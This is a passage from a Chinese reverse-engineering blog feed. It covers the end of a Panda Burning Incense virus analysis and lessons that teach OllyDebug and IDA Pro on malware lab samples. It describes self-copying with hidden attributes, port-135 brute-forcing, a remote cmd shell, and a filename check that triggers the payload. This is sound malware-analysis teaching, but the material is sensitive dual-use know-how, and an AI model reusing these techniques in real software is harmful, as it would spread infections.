猜测这下面应该就是用代码来实现拷贝自身到系统目录了，动静态分析后确实发现是将自身程序拷贝到系统目录改名位系统文件名进行伪装，并且设置属性为隐藏属性。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907125358664-336292961.png" alt="image-20210907125357951"> </p><p>接着程序就会运行在系统目录下的自身程序，并且退出当前的进程，当用OD call这个ExitProcess 程序就会退出跑飞。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907125834765-1488978688.png" alt="image-20210907125834562"> </p><h3 id="②-sub-0040CA5C"><a href="#②-sub-0040CA5C" class="headerlink" title="② sub_0040CA5C"></a>② sub_0040CA5C</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第二个Call: 创建一个线程，设置定时器，创建随机数，线程函数内网135端口批量爆破。</span><br></pre></td></tr></table></figure><p>​    进入Call后分别有3个Call，第一个是创建线程。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907131806068-1586305527.png" alt="image-20210907131805794"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907131829169-1745553470.png" alt="image-20210907131829013"> </p><p>第二个Call是设置一个Timer计时器。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907131855870-491188188.png" alt="image-20210907131855731"> </p><p>第三个Call有创建随机数，然后调用线程函数运行<code>sub_0040B76C</code></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907132007331-901609224.png" alt="image-20210907132006516"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907132446142-1516376043.png" alt="image-20210907132444542"> </p><h3 id="③-sub-0040C97C"><a href="#③-sub-0040C97C" class="headerlink" title="③ sub_0040C97C"></a>③ sub_0040C97C</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第3个Call：终止定时器，设置4个新的计时器</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907132927954-1956265049.png" alt="image-20210907132927685"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907132950033-1402855712.png" alt="image-20210907132949903"> </p><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><p>终于到此熊猫烧香都分析完了，从行为分析开始然后过渡到IDR软件静态分析，x32dbg动态调试分析，分析每个Call的用途，结合动静态进行验证猜测还原代码，希望各位能通过此篇文章学习到一些基础和技巧，个人水平有限文章内如有错误请指正谢谢。</p><p>有不懂的或者想一起交流逆向分析、PWN、Web安全的可以加QQ群</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210907133547799-151416076.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt; 

&lt;p&gt;这一节主要通过熊猫烧香病毒来进行融会贯通，将前面学到过的所有知识都进行实践。&lt;/p&gt;
&lt;p&gt;所有的例子和工具都可以在&lt;a href=&quot;https://github.com/Vxe</summary>
      
    
    
    
    <category term="PC逆向" scheme="https://vxer-lee.github.io/categories/PC%E9%80%86%E5%90%91/"/>
    
    
    <category term="恶意代码分析系列" scheme="https://vxer-lee.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战五：OllyDebug动态结合</title>
    <link href="https://vxer-lee.github.io/2021/08/12/MalwareAnalysis/5.OllyDebug/"/>
    <id>https://vxer-lee.github.io/2021/08/12/MalwareAnalysis/5.OllyDebug/</id>
    <published>2021-08-12T10:04:20.000Z</published>
    <updated>2021-08-16T11:03:47.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/> <p>这一节课，主要是利用OD对目标程序进行动态分析，从而学习OllyDebug的使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab-09-02.exe</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">使用工具：</span><br><span class="line">1.小生我怕怕版OD</span><br><span class="line">2.Strings</span><br><span class="line">3.IDA Pro</span><br><span class="line"></span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">1、在二进制文件中，你看到的静态字符串是什么？</span><br><span class="line">2、当你运行这个二进制文件时，会发生什么？</span><br><span class="line">3、怎样让恶意代码的攻击负载（payload）获得运行？</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line"></span><br><span class="line">以下请读者看完文章后自行完成，相信你可以的。</span><br><span class="line">4、在地址0x00401133处发生了什么？</span><br><span class="line">5、传递给子例程（函数）0x00401089的参数是什么？</span><br><span class="line">6、恶意代码使用的域名是什么？</span><br><span class="line">7、恶意代码使用什么编码函数来混淆域名？</span><br><span class="line">8、恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？</span><br></pre></td></tr></table></figure><p>其中1-2题大家利用已学的动静态分析基础技术来进行分析，这里就不再继续演示了</p><p>首先我们用OD载入Lab-09-02.exe，然后在main函数入口出下断点，相信大家都应该都已经会了吧，如果还不会可以继续复习下，第四课：IDA Pro神器的使用。</p><h2 id="OllyDebug界面介绍"><a href="#OllyDebug界面介绍" class="headerlink" title="OllyDebug界面介绍"></a>OllyDebug界面介绍</h2><p>首先OD 一共分4块界面，左上的这一块是反汇编视图，右上的这一块是寄存器视图，左下的这一块是内存视图，右下的这一块是堆栈视图。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816171955151-1274863806.png" alt="image-20210816171954060"> </p><h2 id="OllyDebug载入程序方法"><a href="#OllyDebug载入程序方法" class="headerlink" title="OllyDebug载入程序方法"></a>OllyDebug载入程序方法</h2><p>我们载入<code>Lab-09-02.exe</code>，在OD菜单处点击<code>文件-&gt;打开-&gt;</code>然后选择恶意程序进行载入，也可以用快捷键F3来操作。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816172244712-1734096665.png" alt="image-20210816172244452"> </p><h2 id="OllyDebug地址跳转"><a href="#OllyDebug地址跳转" class="headerlink" title="OllyDebug地址跳转"></a>OllyDebug地址跳转</h2><p>接着在反汇编视图处按快捷键<code>ctrl+g</code>调出跳转地址窗口，输入main函数入口点然后点击OK跳转过去。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816172456331-1340188303.png" alt="image-20210816172456001"> </p><h2 id="OllyDebug下断点"><a href="#OllyDebug下断点" class="headerlink" title="OllyDebug下断点"></a>OllyDebug下断点</h2><p>跳转过来后按F2下一个断点，然后按F9运行程序，F9运行后程序断下了我们断点的位置，可以根据<code>EIP寄存器</code>，用来保存<code>当前CPU即将执行指令的地址</code>，总之可以根据eip指针来看程序现在执行到哪里了。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816172612264-843929760.png" alt="image-20210816172612021"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816173104893-220076812.png" alt="image-20210816173104447"> </p><p>首先我们来看看标红处，可以看到这里有一堆的mov指令，将字节送入栈空间。</p><p>这里我们注意观察可以看到他有两个0的地方，像是分成了两块，有点开发经验的同学可能就知道，其实这是字符串的结尾符，</p><p>因为我们在定义一个字符串的时候一般在尾部系统都会自动的添加一个00用来代表这个字符串结束了，所以这里其实是将两个字符串放到了栈空间里面。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816173401288-1499219950.png" alt="image-20210816173400867"> </p><h2 id="OllyDebug单步执行"><a href="#OllyDebug单步执行" class="headerlink" title="OllyDebug单步执行"></a>OllyDebug单步执行</h2><p>接着，我们来单步执行(F8)，这里讲下单步的命令，其中(F7单步步入)代表的意思是遇到Call后会跟进去，而(F8单步步过)遇到Call后不会跟进去会步过。</p><p>我们按6次F8后执行到了00401133指令处，然后可以在堆栈信息处看到，当前堆栈空间里面存放的是’B’字符。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816173845693-525790708.png" alt="image-20210816173845325"> </p><h2 id="OllyDebug查看内存窗口数据"><a href="#OllyDebug查看内存窗口数据" class="headerlink" title="OllyDebug查看内存窗口数据"></a>OllyDebug查看内存窗口数据</h2><p>接着我们在堆栈信息窗口处，鼠标右键-&gt;<code>数据窗口中跟随地址</code>，然后一直F8直到运行到了0这位置为止。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816174410496-1070421594.png" alt="image-20210816174410107"> </p><p>可以看到内存窗口处，汇编指令写入栈空间处的地方生成了字符串。<code>1qaz2wsx3edc</code></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816175037478-769423772.png" alt="image-20210816175037026"> </p><p>第二处字符串也是采用通用的方法，可以看到字符串<code>ocl.exe</code></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816175233934-44025855.png" alt="image-20210816175233640"> </p><h2 id="OllyDebug分析函数"><a href="#OllyDebug分析函数" class="headerlink" title="OllyDebug分析函数"></a>OllyDebug分析函数</h2><p>我们一直F8运行到<code>GetModuleFileNameA</code>这一处，然后可以看到这里有3个push，之前我们讲IDA的时候说过，call 就是一个函数，而call上面挨着的push一般是函数的参数，所以这地方一共有3个参数，我们可以在堆栈窗口中看到参数的详细信息。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816175824053-1259896155.png" alt="image-20210816175823553"> </p><p>然后我们可以看到第二个参数是一个buffer，而第三个参数是buffer的大小，我们在第二个参数处右键-&gt;数据窗口中跟随，接着看内存窗口。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816180059746-2002474689.png" alt="image-20210816180059423"> </p><p>可以看到此时的buffer是空的，我们需要执行<code>GetModuleFileNameA</code>后看看buffer中的数据，这里透露下，其实这个api函数是获取当前程序的路径，而我这程序是在桌面运行的，所以buffer数据应该是桌面路径+程序名。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816180232818-1666540118.png" alt="image-20210816180232477"> </p><p>当F8执行后，果然内存窗口中出现了当前的路径字符串。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816180505154-628834644.png" alt="image-20210816180504890">  </p><h2 id="IDA和OllyDebug动态结合"><a href="#IDA和OllyDebug动态结合" class="headerlink" title="IDA和OllyDebug动态结合"></a>IDA和OllyDebug动态结合</h2><p>我们继续F8执行到<code>00401217</code>地址处，然后可以在堆栈窗口看到这个函数一共2个参数，而且第一个参数就是刚才得到的路径，第二个是一个字符<code>\</code>。由于在这里OD并没有给我们分析出来这个函数是干嘛的，所以我们需要借助IDA来分析这个函数的功能。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816181034512-1941473845.png" alt="image-20210816181034117"> </p><p>在IDA中跳到对应的地址，然后可以看到这个函数<code>strrchr</code>，功能详见图2。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816181339623-839302031.png" alt="image-20210816181339319"> </p><p>所以这个函数运行后应该是会返回第二个参数，最后一次出现在字符串中的位置。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816181538969-1539614856.png" alt="image-20210816181538745"> </p><h2 id="OllyDebug载入符号表"><a href="#OllyDebug载入符号表" class="headerlink" title="OllyDebug载入符号表"></a>OllyDebug载入符号表</h2><p>那么这里为什么OD没有帮我们分析出这个函数是<code>strrchr</code>呢，其实原因是因为OD没有该程序的符号表，我们可以通过IDA中点击菜单中的<code>File-&gt;Produce file-&gt;Create MAP file...</code>然后勾选图2中的选项后导出map文件。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816182029171-1220600959.png" alt="image-20210816182028944"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816182308294-1728232077.png" alt="image-20210816182307395"> </p><p>然后在OD中点击菜单<code>插件-&gt;LoadMapEx-&gt;LoadMapEx</code>,然后选择我IDA生成的符号表文件后，可以看到在图2中看到原本OD没有显示的符号表中的函数，现在显示出来了。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816182540577-1013516452.png" alt="image-20210816182540252"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816182736212-1109494447.png" alt="image-20210816182735826"> </p><p>函数执行后，我们可以在eax中看他的返回值，他返回了程序的文件名。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816183000038-1155004373.png" alt="image-20210816182959593"> </p><h2 id="OllyDebug得到答案"><a href="#OllyDebug得到答案" class="headerlink" title="OllyDebug得到答案"></a>OllyDebug得到答案</h2><p>然后我们继续f8执行到<code>strcmp</code>处，可以在堆栈窗口中看到两个字符串<code>ocl.exe</code>和<code>Lab09-02.exe</code>，那么到这里我们就大概明白了为什么程序运行后什么反应都没有，是因为他进行了程序名的判断，如果程序名不是ocl.exe那么程序运行后就是直接退出的，那么最后我们来验证下将程序文件名改为ocl.exe运行后看看会有什么效果。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816183249046-1534120844.png" alt="image-20210816183248742"> </p><p>那么执行后呢，可以在Process Explorer中看到程序呢没有退出了而是正常的运行了。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816183635907-1615110617.png" alt="image-20210816183635662"> </p><p>恶意程序创建的Handles</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816183927424-1103472455.png" alt="image-20210816183927262"> </p><p>恶意程序调用到的dll</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816184011791-1429055405.png" alt="image-20210816184011597"> </p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这一节我们主要根据实验的例子学会了如何的使用OllyDebug这个工具</p><ul><li>了解了OD的界面（反汇编窗口、寄存器窗口、数据窗口、堆栈窗口）</li><li>演示了OD如何载入程序(F3)</li><li>OD如何进行地址的跳转(Ctrl+g)</li><li>OD如何下断点(F2)</li><li>OD如何单步步过(F8)</li><li>OD如何单步步入(F7)</li><li>OD查看内存数据窗口的方法</li><li>OD分析函数，参数和返回值(参数在堆栈窗口，返回值在eax)</li><li>IDA和OD动态结合分析</li><li>OD加载IDA导出的符号表</li><li>通过修改程序名来达到运行恶意程序的目的</li></ul><p>欢迎加入QQ群：一起研究逆向、PWN、WEB安全、物联网安全</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816190030059-1584849828.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt; 

&lt;p&gt;这一节课，主要是利用OD对目标程序进行动态分析，从而学习OllyDebug的使用。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;</summary>
      
    
    
    
    <category term="PC逆向" scheme="https://vxer-lee.github.io/categories/PC%E9%80%86%E5%90%91/"/>
    
    
    <category term="恶意代码分析系列" scheme="https://vxer-lee.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战四：IDA Pro神器的使用</title>
    <link href="https://vxer-lee.github.io/2021/08/11/MalwareAnalysis/4.IDAPro/"/>
    <id>https://vxer-lee.github.io/2021/08/11/MalwareAnalysis/4.IDAPro/</id>
    <published>2021-08-11T10:04:20.000Z</published>
    <updated>2021-08-16T11:03:42.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/> 这节课主要通过使用IDA Pro来进行静态高级分析## 实验：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab05-01.dll</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">使用工具：</span><br><span class="line">1. IDA Pro</span><br><span class="line"></span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">1、DllMain的地址是什么？</span><br><span class="line">2、使用Imports窗口并浏览到的gethostbyname，导入函数定位到什么地址？</span><br><span class="line">3、有多少函数调用了gethostbyname？</span><br><span class="line">4、将精力集中在位于0x10001757处的对gethostbyname的调用，你能找出哪个DNS请求将被触发吗？</span><br><span class="line">5、IDA Pro识别了在0x10001656处的子过程中的多少个局部变量？</span><br><span class="line">6、IDA Pro识别了在0x10001656处的子过程中的多少个参数？</span><br><span class="line">7、使用Strings窗口，来在反汇编中定位字符串\cmd.exe &#x2F;c 。它位于哪？</span><br><span class="line">8、在引用\cmd.exe &#x2F;c的代码所在的区域发生了什么？</span><br><span class="line">9、在同一的区域，在0x100101C8处，看起来好像是dword_1008E5C4是一个全局变量，它帮助决定走哪条路径。那恶意代码是如何设置dword_1008E5C4的呢？(提示：使用dword_1008E5C4的交叉引用。)</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br></pre></td></tr></table></figure><h3 id="题目1：利用IDA-Pro分析dll的入口点并显示地址"><a href="#题目1：利用IDA-Pro分析dll的入口点并显示地址" class="headerlink" title="题目1：利用IDA Pro分析dll的入口点并显示地址"></a>题目1：利用IDA Pro分析dll的入口点并显示地址</h3><p>按照如下步骤打开IDA Pro并且加载dll文件进行分析。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816104445140-184611703.png" alt="image-20210816104447048"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816104555816-947610536.png" alt="image-20210816104555256"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816104633883-1055870137.png" alt="image-20210816104634494"> </p><p>等待分析完毕后，IDA Pro自动的会显示出dll的入口点函数<code>dllmain</code>，如图。</p><p>题目1让我们显示出dllmain函数的地址，这里有两种方法，第一种方法是直接按空格切换成文本视图，第二种方法是在设置中显示带地址的图形显示。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816104744957-480242822.png" alt="image-20210816104746502"> </p><h4 id="空格切换文本视图："><a href="#空格切换文本视图：" class="headerlink" title="空格切换文本视图："></a>空格切换文本视图：</h4><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816104959803-1794537836.png" alt="image-20210816105000976"> </p><h4 id="带地址显示图形界面"><a href="#带地址显示图形界面" class="headerlink" title="带地址显示图形界面"></a>带地址显示图形界面</h4><p>点击菜单 Options-&gt;General…-&gt;勾上 Line prefixes (graph)</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816105343930-845268980.png" alt="image-20210816105345486"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816105413858-1436092045.png" alt="image-20210816105414962"> </p><h3 id="题目2：IDA-Pro导入表窗口"><a href="#题目2：IDA-Pro导入表窗口" class="headerlink" title="题目2：IDA Pro导入表窗口"></a>题目2：IDA Pro导入表窗口</h3><p>在<code>Imports</code>窗口中按<code>ctrl+f</code>进行搜索输入<code>gethostbyname</code>，定位到gethostbyname后双击过去调到文本视图界面看到其地址。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816110306035-1827634251.png" alt="image-20210816110307586"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816110607431-642110554.png" alt="image-20210816110608131"> </p><h3 id="题目3：交叉应用，看多少处函数调用了"><a href="#题目3：交叉应用，看多少处函数调用了" class="headerlink" title="题目3：交叉应用，看多少处函数调用了"></a>题目3：交叉应用，看多少处函数调用了</h3><p>在<code>gethostbyname</code>处按<code>ctrl+x</code>调出<code>交叉引用</code>，能看到所有对gethostbyname处有调用读取写入等的所有地方。</p><p>点击<code>Type</code>进行类型排序，然后我们仔细来看这里有两个Type，一个是<code>p</code>代表的是函数,<code>r</code>代表的是读取属性，</p><p>所以这里一共有9个p，但是这9个p并不能代码是9个函数调用了，我们在仔细来看图2，其中他有很多地址重复的，所以我们按照地址来分一共可以分析出是4处函数调用了gethostbyname。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816111104186-499963902.png" alt="image-20210816111105632"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816111303775-965161103.png" alt="image-20210816111304620"> </p><h3 id="题目4：利用ctrl-g跳转地址"><a href="#题目4：利用ctrl-g跳转地址" class="headerlink" title="题目4：利用ctrl+g跳转地址"></a>题目4：利用ctrl+g跳转地址</h3><p>将精力集中在位于0x10001757处的对gethostbyname的调用，你能找出哪个DNS请求将被触发吗？</p><p>首先我们用ctrl+c拷贝<code>0x10001757</code>这个地址，然后在IDA Pro文本视图或界面视图，按<code>g</code>按键，跳转到对应的地址处。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816112255949-145256771.png" alt="image-20210816112256669"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816112340299-1431434786.png" alt="image-20210816112341517"> </p><p>切换到界面视图，然后对题目4的问题进行分析：你能找出哪个DNS请求将被触发吗？，我们找找gethostbyname的参数，一般call的意思就是调用函数，这里call gethostbyname就是调用gethostbyname这个api函数，然后call上面挨着的push就是函数参数，可以看到这里就一个参数<code>push eax</code>，参数是eax，所以我们来看看是什么给eax进行了赋值，往上可以看到有一句<code>mov eax,off_10019040</code>，这种带off_或者dword_下划线后面加个地址的可能都是<code>全局变量</code>，在后面有个注释是IDA Pro自动加上的，他这里分析出来off_10019040是一个字符串<code>[This is RDO]pics.praticalmalwareanalys</code></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816112955114-481820878.png" alt="image-20210816112956670"> </p><p>我们也可以直接双击全局变量过去，跳到他的定义处，在图一中还有一句<code>add eax,0Dh</code>，意思是将eax字符串的指针指向从开头后0xD也就是后13处，那么正好是<code>pics.praticalmalwareanalys</code>这个域名被解析。（答案）</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816113031607-2135903345.png" alt="image-20210816113033143"> </p><h3 id="题目5：局部变量分析"><a href="#题目5：局部变量分析" class="headerlink" title="题目5：局部变量分析"></a>题目5：局部变量分析</h3><p>IDA Pro识别了在0x10001656处的子过程中的多少个局部变量？</p><p>首先跳转到地址处，不再重复如何跳转。然后我们在汇编代码的上面可以看到这些东西，红色标记的地方，这些都是局部变量和参数，其中<code>带负号的</code>都是局部变量，这里一共有23个带负号的，也就是23个局部变量。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816114625959-184048211.png" alt="image-20210816114619883"> </p><h3 id="题目6：函数参数分析"><a href="#题目6：函数参数分析" class="headerlink" title="题目6：函数参数分析"></a>题目6：函数参数分析</h3><p>IDA Pro识别了在0x10001656处的子过程中的多少个参数？</p><p>看上面的图，其中<code>正数</code>的就是参数，这里只有一个参数<code>lpThreadParameter</code>，其实也可以看函数头注释那里，IDA Pro自动分析出了<code>DWORD __stdcall sub_10001656(LPVOID lpThreadParameter)</code>,可以看出是一个参数。</p><h3 id="题目7：Strings字符串窗口"><a href="#题目7：Strings字符串窗口" class="headerlink" title="题目7：Strings字符串窗口"></a>题目7：Strings字符串窗口</h3><p>使用Strings窗口，来在反汇编中定位字符串\cmd.exe /c 。它位于哪？</p><p>我们可以按<code>shift+f12</code>来打开字符串窗口，可以在菜单中点击<code>View-&gt;Open subviews-&gt;Strings</code>打开字符串窗口。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816115334023-746650587.png" alt="image-20210816115335485"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816115421364-1346612923.png" alt="image-20210816115422773"> </p><p>双击过去之后点击这个地方，然后在图2中可以看到是<code>0x100101D0</code>位置的反汇编<code>push offset aCmdExeC</code>处。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816115503148-600830893.png" alt="image-20210816115504628"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816115755533-544225403.png" alt="image-20210816115756935"> </p><h3 id="题目8：代码分析"><a href="#题目8：代码分析" class="headerlink" title="题目8：代码分析"></a>题目8：代码分析</h3><p>在引用\cmd.exe /c的代码所在的区域发生了什么？</p><p>我们在<code>100101D0</code>地址处，按一下按键<code>F5</code>进入反编译<code>C++伪代码</code>进行代码分析。</p><p>首先我们在函数开头的地方开始逐步分析，可以看到一些敏感的字符串，这里有个关键字<code>Remote Shell Session</code>，所以这个程序应该是一个恶意远程Shell程序。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816131036278-140707818.png" alt="image-20210816131035431"> </p><p>接着就是用控制命令，远程创建cmd命令来达到执行Shell的目的。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816131140522-831968227.png" alt="image-20210816131140039"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816132028053-1280503178.png" alt="image-20210816132027587"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816132157816-39449530.png" alt="image-20210816132157267"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816132317738-927087262.png" alt="image-20210816132317331"> </p><h3 id="题目9：进阶分析"><a href="#题目9：进阶分析" class="headerlink" title="题目9：进阶分析"></a>题目9：进阶分析</h3><p>在同一的区域，在0x100101C8处，看起来好像是dword_1008E5C4是一个全局变量，它帮助决定走哪条路径。那恶意代码是如何设置dword_1008E5C4的呢？(提示：使用dword_1008E5C4的交叉引用。)</p><p>跳转到地址，然后点击全局变量，在全局变量位置处按<code>ctrl+x</code>调出交叉引用，然后可以看到有w 和r两种属性，其中我们可以知道w就是写入属性，而题目中需要我们来<code>cmp</code>走哪条分支，还有如何设置dword_1008E5C4全局变量，那么肯定是要看w属性看是什么东西写入到了全局变量<code>dword_1008E5C4</code>。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816133055623-349433222.png" alt="image-20210816133055222"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816133213759-1353706750.png" alt="image-20210816133213139"> </p><p>可以看到代码处是eax复制给了全局变量<code>dword_1008E5C4</code>,而eax来源于上一句call的返回值，所以我们需要继续跟入Call来看他的返回值是什么？</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816133907565-694390482.png" alt="image-20210816133907012"> 